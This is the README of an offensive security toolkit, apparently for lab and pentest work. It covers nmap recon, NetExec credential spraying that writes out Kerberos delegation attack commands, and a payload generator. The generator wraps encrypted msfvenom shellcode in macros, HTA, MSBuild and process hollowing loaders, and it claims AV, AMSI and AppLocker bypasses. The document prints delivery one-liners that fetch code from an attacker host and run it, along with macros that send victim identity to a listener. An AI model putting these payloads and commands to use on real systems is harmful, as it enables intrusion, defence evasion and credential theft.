# TomSploit

A small toolkit for authorised network assessment work. Three tools covering
the full lab pipeline: recon, credential triage, and payload delivery.

| Tool | What it does |
|------|--------------|
| [**tombuster**](#tombuster) | Staged `nmap` recon. Maps and names a whole subnet, reports on every host, then runs the slow per‑host enumeration. |
| [**tomsploit**](#tomsploit) | Fast [NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`) triage. Sprays a credential set across protocols, confirms what's valid, and writes a Kerberos delegation walkthrough. |
| [**tomcrypt**](#tomcrypt) | Payload generator. Encrypts msfvenom shellcode (AES‑256‑CBC or XOR) and wraps it in a choice of delivery formats: VBA macros, HTA files, MSBuild XML, process hollowing, Remote Template Injection, Ligolo‑ng tunnel, and Linux loaders. |

The usual order is `tombuster` first — it tells you what's on the wire and
which hosts are domain controllers — then `tomsploit` once you have a
credential to try, and `tomcrypt` to build the payload once you have a
foothold or a phishing opportunity.

> Use only against systems you are authorised to test.

---

## Install

Both tools ship as zipapps. No `pip install`, no dependencies beyond the
standard library and the external scanner each one drives.

```bash
git clone https://github.com/twhitehead290/TomSploit.git
cd TomSploit
```

`tomsploit.pyz` carries a shebang, so it can be run directly:

```bash
chmod +x tomsploit.pyz
./tomsploit.pyz --help
```

`tombuster.pyz` has no shebang — invoke it through the interpreter:

```bash
python3 tombuster.pyz --help
```

Or copy either one where you need it:

```bash
scp tombuster.pyz kali@box:/tmp/ && ssh kali@box sudo python3 /tmp/tombuster.pyz -h
```

**Requirements**

- **Python 3.10+** (both tools use `X | None` type syntax).
- **[nmap](https://nmap.org/)** on `PATH` — tombuster's scanning engine.
  Run it with `sudo` or `cap_net_raw`; unprivileged it falls back to a
  connect scan and cannot do UDP at all.
- **[NetExec](https://github.com/Pennyw0rth/NetExec)** (`nxc`) on `PATH` —
  tomsploit's scanning engine.
- Optional, only for tomsploit's `-k` ticket conversion:
  `impacket-ticketConverter`.

The **generated commands** reference the usual AD toolkit (impacket,
hashcat, certipy, BloodHound, krbrelayx, PetitPotam, Rubeus, …). You run
those yourself; neither tool requires them to be installed to *emit* the
commands.

---

# tombuster

Staged `nmap` reconnaissance. The point is that you never pass ports
between stages by hand, and that a partial picture is never dressed up as
a complete one.

```bash
sudo python3 tombuster.pyz -t 10.10.10.0/24
```

## The pipeline

Run‑level first, across every host at once, before any per‑host work:

| Stage | Name | What it does |
|-------|------|--------------|
| 0 | discovery | Sweep the CIDR/range for live hosts |
| 0b | triage | One ordinary nmap over all of them |
| 0c | identify | Who each host is: name, light `-sV`, SMB signing |
| 0d | assessment | Recommendations for **every** host, printed and written to `initial-assessment.md` |

Then per host:

| Stage | Name | What it does |
|-------|------|--------------|
| 1 | tcp-initial | nmap's default port selection |
| 2 | tcp-detail | `-A --script default` over those ports — `report.md` lands here |
| 3 | tcp-all | All 65535 TCP ports |
| 4 | tcp-detail-new | `-A` over whatever stage 3 added, if anything |
| 5 | tcp-vuln | The `vuln` script category, all ports |
| — | udp | 20 curated UDP ports, alongside everything from the start, privileges permitting |

A service‑aware recommendation engine then turns the results into next
steps, every one of which traces back to an observed service or an
explicit scan finding.

## Three invariants

These are the reason the code is shaped the way it is:

- **A skipped phase is never reported as a result.** "UDP was not scanned"
  and "UDP was scanned and nothing answered" are different facts, and the
  reports keep them different.
- **A vulnerability is never claimed from an open port or an old‑looking
  banner.** Findings carry how well the scan actually supports them.
- **The early assessment is always labelled provisional.** Reporting
  before the slow phases is only safe if a partial picture cannot be
  mistaken for a complete one.

Privilege level is stated honestly too — an unprivileged connect scan is a
different measurement, not a slower equivalent, so tombuster says which
one it ran.

## Output

```
scans/START-HERE.md                  which of these to open, with links
scans/<spec>/live_hosts.txt          every host the sweep found, one per
                                     line, written as soon as it ends
scans/<spec>/services.txt            host/port/state/service/evidence/
                                     banner, tab-separated, rewritten as
                                     each phase adds to it
scans/<spec>/initial-assessment.md   all hosts, address order, provisional
scans/<spec>/environment.md          domain, DCs, /etc/hosts, cred plan
scans/<host>/report.md               one host, full detail
scans/<host>/raw/                    nmap's own .xml and .gnmap, per phase,
                                     so any claim above can be checked
```

`environment.md` is the handoff to tomsploit: it names the domain and the
domain controllers.

## Usage

```bash
# Whole subnet, everything
sudo python3 tombuster.pyz -t 10.10.10.0/24

# Through a tunnel (ligolo-ng and similar): SYN-only sweep, -n, one retry
sudo python3 tombuster.pyz -t 10.10.10.0/24 --pivot

# Stop after -A over the default ports — the usual stopping place
sudo python3 tombuster.pyz -t 10.10.10.0/24 --until detail

# Just: what is alive
sudo python3 tombuster.pyz -t 10.10.10.0/24 --until discovery

# Reuse per-host phases that completed in a previous run
sudo python3 tombuster.pyz -t 10.10.10.5 --resume
```

`--until` takes any of `discovery, triage, assess, initial, detail, full,
vuln, all` (default `all`), and forgives the obvious synonyms — `sweep`,
`hosts`, `ports`, `quick`, `services`, `allports` and friends all resolve
to the right point. Recommendations are always produced for whatever was
reached.

## Key options

```
-t, --target SPEC       host, comma list, CIDR/range, or a file of hosts;
                        repeatable
-o, --output-dir DIR    where scan directories go

stages
--until POINT           stop after this point and report on what was found
--no-discovery          scan every address instead of sweeping for live hosts
--no-triage             skip stage 0b, and 0c/0d with it
--no-identify           skip stage 0c (no hostnames, no versions in 0d)
--no-rdns               don't use a discovered nameserver for reverse lookups
--resume                reuse per-host phases from a previous run

depth
--skip-full             skip the full -p- sweep
--no-vuln               skip the intrusive scripts — much faster
--skip-mail             leave smtp-open-relay out
--min-cvss N            only report vulners CVEs at or above this score
--skip-udp              skip the UDP scan
--udp-ports LIST        UDP ports for the concurrent scan

nmap tuning
--pivot                 through a tunnel: SYN-only sweep, -n, one retry
--discovery-ports LIST  stage 0 SYN probe ports — a host whose only open
                        port is missing here is invisible to the sweep
--identity-intensity N  stage 0c -sV intensity (0-9, or -1 to drop -sV)
--identity-max-ports N  cap stage 0c's port list
--min-rate N            nmap --min-rate, phase 2 only
--max-retries N         nmap --max-retries for the TCP sweeps
--host-timeout TIME     nmap --host-timeout, e.g. 30m
--timeout SEC           wall-clock ceiling per stage
-n, --no-dns            never resolve names
--nmap-arg ARG          one extra nmap argument, repeatable; never goes
                        through a shell
--max-hosts N           refuse a run resolving more than N hosts
                        (default 64; 0 disables)

output
-v / -vv                each host's report as it finishes / nmap's raw output
--json PATH             also write everything as JSON
--no-report             don't write report.md
--no-color              disable colour (automatic when piped)
```

---

# tomsploit

Fast NetExec triage across protocols and targets.

`tomsploit` sprays a credential set against every available protocol,
confirms which logins are valid, and prints the **exact follow‑up
commands** for each win — already filled in with the target, domain,
username and credential. When a login works on a domain controller it runs
a read‑only enrichment pass and writes a per‑account **Kerberos delegation
walkthrough** to disk.

It is a careful `nxc` front‑end with a context‑aware command generator,
**not** a one‑shot attack‑and‑loot engine.

```
$ tomsploit -t 10.129.205.35 -u carole.rose -p 'jasmine'
  ...
  ✔ SMB (domain)   INLANEFREIGHT.LOCAL\carole.rose:jasmine
  ✔ LDAP (domain)  INLANEFREIGHT.LOCAL\carole.rose:jasmine
  ⊕ enrich  delegation: 2x constrained_pt, 2x unconstrained; MAQ: 0; roastable: 7

  🔑 Delegation — 4 finding(s)
      callum.dixon   DCSync (capture DC TGT)      need: secret: AS-REP roastable now
      beth.richards  DCSync (delegates to the DC) need: secret: kerberoastable now
      DMZ01$         SYSTEM on WS01.INLANEFREIGHT.LOCAL
      SQL01$         DCSync (capture DC TGT)      need: SYSTEM on SQL01 or its hash

      full commands → tomsploit-delegation-10.129.205.35-carole.rose.txt
```

## Scope

**Enumeration only.** `tomsploit` finds and reports access — and flags
relay‑able hosts, domain controllers, anonymous access, and credentials
that are valid‑but‑unusable — but it does not exploit, dump, or loot.
Every enrichment query reads the directory; nothing is modified. The tool
hands you the commands to take the next step yourself.

This makes it well suited to lab/OSCP‑style workflows and authorised
engagements where you want a fast read on what a credential unlocks and a
ready‑to‑run plan for each finding.

## Features

- **Multi‑protocol spray** across `smb, ssh, ldap, ftp, wmi, winrm, rdp,
  vnc, mssql, nfs` (VNC and NFS off by default), domain and local‑auth in
  one pass.
- **Flexible credentials:** password, NTLM hash (Pass‑the‑Hash), Kerberos
  ticket cache, or a `user:secret` combo file. Cross‑spray or positional
  pairing.
- **Context‑aware next commands** per valid login, with a one‑line outcome
  hint on each ("what a hit looks like and where it leads", not a
  description of the command).
- **Pre‑flight port probe** to skip protocols whose port is closed, and
  lockout‑aware spray accounting.
- **Relay / DC / anonymous‑access detection** surfaced as first‑class
  findings.
- **Automatic Kerberos delegation engine** (see below) — the headline
  feature.
- **Three verbosity levels** for the command output: `--bare` (commands
  only), default (commands + one‑line hints), `--notes` (full reasoning
  and caveats).
- **Paste‑ready script output** with `--sh`.

## The delegation engine

When an LDAP credential works on a DC, `tomsploit` runs a batch of
read‑only queries and turns the results into an actionable, per‑account
Kerberos‑delegation plan.

It enumerates delegation with `--find-delegation`, then resolves each
finding with targeted queries so the routes are **decisions, not
homework**:

- **Roastability** — for each delegating account, is it kerberoastable
  (`servicePrincipalName`) or AS‑REP‑roastable (`userAccountControl`)
  *right now*? The route emits the exact roast command instead of
  "kerberoast it if it has an SPN".
- **Disabled accounts** — a route on a disabled account is marked dead up
  front.
- **MachineAccountQuota** — resolves whether RBCD "add a computer" is even
  possible (`MAQ 0` → path dead).
- **`msDS-AllowedToDelegateTo`** — the full constrained‑delegation target
  list, so "this delegates to the DC" (→ DCSync via an `ldap/` sname swap)
  is detected authoritatively.
- **Direct‑ACE writers** (`daclread`, per account) — who can write the
  account's SPN / RBCD attribute, for the direct‑ACE case.
  Group‑inherited rights are invisible to this and the output says so,
  pointing you to BloodHound.

Each abusable delegation is written to
`tomsploit-delegation-<ip>-<user>.txt` as a self‑contained route:

```
# ╭─────────────────────────────────────────────────────────────────────────╮
# │ [2/4]  CONSTRAINED + PROTOCOL TRANSITION on beth.richards →              │
# │        DC01.INLANEFREIGHT.LOCAL (the DC)                                 │
# ╰─────────────────────────────────────────────────────────────────────────╯
#
# GET     : DCSync — every hash in the domain (incl. krbtgt)
# REQUIRED: beth.richards's secret — nothing else
# MISSING : beth.richards's secret — kerberoast now (cmd below)
# WHY     : the allowed SPN is on the DC, so swapping the service class
#           TERMSRV/ → ldap/ on the same host yields a DCSync ticket
#
    # ── GET THE CRED: beth.richards holds an SPN — kerberoastable now:
    nxc ldap 10.129.205.35 -u carole.rose -p 'jasmine' \
      --kerberoasting beth.richards.roast --kerberoast-account beth.richards
    hashcat -m 13100 beth.richards.roast /usr/share/wordlists/rockyou.txt
    ...
```

Each route reads:

| Field | Meaning |
|-------|---------|
| **GET** | what you end up holding if the steps succeed |
| **REQUIRED** | the complete prerequisite list for the commands |
| **MISSING** | the subset of REQUIRED you don't hold yet, each with how to get it |
| **WHY** | the mechanism, where it isn't obvious from the commands |

Notes on the generated file:

- **Values are filled in.** DC name/FQDN, your account, chosen passwords —
  only genuinely unknown things (a secret you haven't cracked, a runtime
  ticket blob) stay as `<placeholders>`.
- **It's aware of the account you ran as.** If a route is *for* the account
  you authenticated with, it doesn't tell you to roast a password you
  already hold — it uses your real credential and marks the secret as held.
- **It's paste‑safe.** Drop the file into a shell and it runs only the
  fully‑resolved commands; anything with an unfilled `<placeholder>` is
  commented out. Every value pulled from Active Directory (account names,
  SPNs, ACL trustees) is sanitised, so a hostile object name can't inject
  a command.
- **The commands use the correct impacket syntax** — passwords go in the
  identity string (`domain/user:password`), because
  `getST`/`rbcd`/`addcomputer` have no `-p` flag.

Disable the whole pass with `--no-enrich`. Run the same engine offline on
`findDelegation` output you already have with `--deleg-in`.

## Usage

```bash
# Password against one host
tomsploit -t 192.168.1.10 -u admin -p 'Password123'

# Spray a users list × passwords list across a /24
tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt

# Pass-the-Hash
tomsploit -t target.htb -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Positional pairing: line N of users.txt only against line N of hashes.txt
tomsploit -t 192.168.1.10 -u users.txt -H hashes.txt --paired

# Combo file (user:secret per line; hashes auto-detected and used as PtH)
tomsploit -t 192.168.1.10 --combo creds.txt

# Kerberos ticket cache
tomsploit -t dc01.corp.local -u admin -k

# Restrict protocols
tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp

# Paste-ready shell script (findings become comments; progress goes to stderr)
tomsploit -t 192.168.1.10 -u admin -p pw --sh > next.sh
```

### Delegation

```bash
# Automatic: a valid DC login triggers the enrichment pass and writes
# tomsploit-delegation-<ip>-<user>.txt with the routes.
tomsploit -t 10.10.10.5 -u carole -p pw

# Skip the extra queries
tomsploit -t 10.10.10.5 -u carole -p pw --no-enrich

# Offline: run the delegation engine on findDelegation output you already have.
# --dc-name enables the "delegates to the DC" (= domain compromise) detection.
nxc ldap 10.10.10.5 -u u -p p --find-delegation \
  | tomsploit --deleg-in - -t 10.10.10.5 -d corp1.com --dc-name DC01 -u u -p p
```

### Output verbosity

| Flag | Command output |
|------|----------------|
| `--bare` | commands only — nothing else |
| *(default)* | commands + a one‑line outcome hint on each |
| `--notes` | full reasoning, caveats, and commented‑out alternatives |
| `-q` / `--quiet` | just valid creds + suggested commands |
| `-v` / `--verbose` | every `nxc` line, including each failed login |
| `--sh` | flush‑left, uncoloured, paste‑ready shell script |

## Key options

```
-t, --target        IP, hostname, CIDR, or file of any of these
-u, --user          username or path to users file
-p, --password      password or path to passwords file
-H, --hash          NTLM hash (LM:NT or NT), or a file of hashes
-k, --kerberos      use a Kerberos ccache (optionally a ticket file path)
-d, --domain        AD domain for domain-scope auth
--paired            positional pairing instead of cross-spray
--combo FILE        user:secret combo file (implies pairing)
--protocols LIST    comma-separated subset of the supported protocols
--no-enrich         skip the post-scan LDAP delegation enrichment
--deleg-in FILE     run the delegation engine offline on findDelegation output
--dc-name NAME      DC short hostname, for the offline "delegates to DC" check
--deleg-out FILE    where to write the delegation file
--bare / --notes    less / more detail in the command output
--sh                emit a paste-ready shell script
-o, --output FILE   write a consolidated scan log
--json-output FILE  write structured results as JSON
--creds-file FILE   append valid credentials to a TSV
```

Run `tomsploit --help` for the complete list.

---

## Safety & correctness notes

- **Read‑only by design.** Both tools measure and report. tomsploit's
  enrichment pass and every generated‑file value come from directory
  reads; it performs no writes. tombuster drives nmap and parses what
  comes back.
- **Generated files hold live credentials.** tomsploit's delegation file
  prints the credential it ran with (it's already in the runnable
  commands), so treat `tomsploit-delegation-*.txt` as sensitive.
- **Parsing is verified against tool source** (nmap, NetExec, impacket)
  and hardened against malformed, partial, and adversarial output — but
  the parsers should be sanity‑checked against a real environment's live
  output on first use; `--no-enrich` restores tomsploit's plain behaviour
  if anything looks off.
- **A louder footprint with enrichment on** — a DC login fires roughly a
  dozen `nxc` queries. Use `--no-enrich` on a monitored engagement if that
  matters. tombuster's `--no-vuln` and `--until detail` are the equivalent
  levers.
- **tombuster refuses runs over 64 resolved hosts** by default
  (`--max-hosts`), so a mistyped CIDR doesn't become an incident.

---

# tomcrypt

Payload generator. Takes a Metasploit payload string, generates shellcode
with `msfvenom`, encrypts it (AES‑256‑CBC or XOR depending on format), and
outputs ready‑to‑deliver files — macros, HTA pages, MSBuild XML, compiled
binaries, and Linux loaders — together with the exact msfconsole handler and
delivery commands.

```bash
python3 tomcrypt.py --help
python3 tomcrypt.py vba runner -H tun0 -P 443
python3 tomcrypt.py hta msbuild -H 10.10.10.1 -P 443
python3 tomcrypt.py linux -H tun0 -f py
```

## Subcommands

| Subcommand | Format options | Technique |
|---|---|---|
| `vba enum` | `.bas` macro | Reconnaissance — fires on document open, POSTs process name, Office arch, and `DOMAIN\user` back to your listener |
| `vba runner` | `.bas` macro | XOR‑encrypted shellcode self‑runner embedded in VBA; no download, no `Add-Type` |
| `vba cradle` | `.bas` macro | Download‑and‑execute cradle — fetches `exe`, `ps1`, or `txt` payload from your HTTP server |
| `vba rti` | `.dotm` + `.docx` + `.bas` | Remote Template Injection — macro‑free lure `.docx` silently fetches macro‑enabled `.dotm`; bypasses AV attachment scan |
| `hta enum` | `.hta` | Reconnaissance HTA — hostname, user, domain, OS/process arch; POSTs back and closes |
| `hta msbuild` | `.hta` | AES‑encrypted C# inline task, compiled on target by `MSBuild.exe`; bypasses CLM and AppLocker |
| `hta installutil` | `.hta` | AES‑encrypted Installer subclass; compiled on Kali, certutil‑encoded, delivered via HTA; bypasses CLM and AppLocker |
| `hollow` | `exe` / `ps1` / `txt` | `exe`: D/Invoke process hollowing (no P/Invoke); `ps1`/`txt`: AMSI bypass + cross‑process inject (x64) or self‑inject (x86) |
| `msbuild` | `.xml` | AES‑encrypted shellcode in MSBuild inline task; one `MSBuild.exe` command on target; bypasses CLM |
| `ligolo` | `.xml` | Wraps `agent.exe` → donut shellcode → AES → MSBuild XML; connect parameters baked in at generation time |
| `linux` | `py` / `elf` | `py`: Python ctypes script, no compilation on target; `elf`: gcc‑compiled ELF; both use AES‑256‑CBC + mmap/mprotect self‑injection |

All Windows shellcode formats support both 32‑ and 64‑bit Office/targets via
`#If Win64` conditional compilation in VBA and architecture‑aware msfvenom flags
elsewhere. Pass the msfvenom payload string with `-p` to target x86:

```bash
python3 tomcrypt.py vba runner -H tun0 -P 443 -p windows/x86/meterpreter/reverse_tcp
```

## The VBA enum output

The reconnaissance macro POSTs a single form‑encoded line to your listener:

```
proc=WINWORD.EXE&arch=x64&user=CORP\jsmith
```

Start a listener with `nc -lvnp 80` before delivering the document, or any
HTTP server that logs POST bodies.

## Remote Template Injection (`vba rti`)

Three files are written:

| File | Role |
|---|---|
| `STEM_lure.docx` | Deliver this to the target — contains no macros |
| `STEM.dotm` | Host this on your HTTP server — contains the VBA shellcode runner |
| `STEM.bas` | Raw VBA source for manual import into Word/LibreOffice |

Word fetches `.dotm` silently on open and fires `AutoOpen` / `Document_Open`
without the normal macro warning that an inlined macro triggers. The lure
`.docx` is macro‑free and typically passes AV attachment scanning.

`tomcrypt` will attempt to create `.dotm` automatically using LibreOffice UNO
headless if `soffice` is in `PATH`. If it isn't, the tool prints step‑by‑step
instructions for creating the template manually.

```bash
python3 tomcrypt.py vba rti -H 10.10.10.1 -P 443 --serve-port 80 -o invoice
# → invoice.bas, invoice.dotm (if LibreOffice available), invoice_lure.docx
```

## Ligolo‑ng tunnel

Converts `agent.exe` to position‑independent shellcode with `donut`, encrypts
it with AES‑256‑CBC, and embeds it in an MSBuild inline task. The connection
parameters are baked in so the target only needs to run one command:

```bash
# On Kali — build the payload
python3 tomcrypt.py ligolo -H 10.10.10.1 -P 11601 -i agent.exe -o tunnel

# On target
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe tunnel.xml
```

## Linux loaders

Two formats, both AES‑256‑CBC decrypt + mmap/mprotect self‑injection:

```bash
# Python ctypes (no compilation on target — just pip install cryptography)
python3 tomcrypt.py linux -H tun0 -f py
# Delivery: curl -s http://LHOST/loader.py | python3

# Compiled ELF (gcc on Kali, libssl on target)
python3 tomcrypt.py linux -H tun0 -f elf
# Delivery: curl -s -o /tmp/l http://LHOST/loader && chmod +x /tmp/l && /tmp/l
```

## Requirements

- **Python 3.10+**
- **[msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)** on `PATH` — all formats except `ligolo`
- **[donut](https://github.com/TheWover/donut)** (`donut` binary) on `PATH` — `ligolo` only
- **gcc + libssl‑dev** — `linux elf` only
- **LibreOffice** (`soffice`) — optional; enables automatic `.dotm` creation for `vba rti`; falls back to manual instructions if absent
- **`cryptography`** Python package — Linux `py` loader on target only (`pip install cryptography`)

---

## License

MIT.
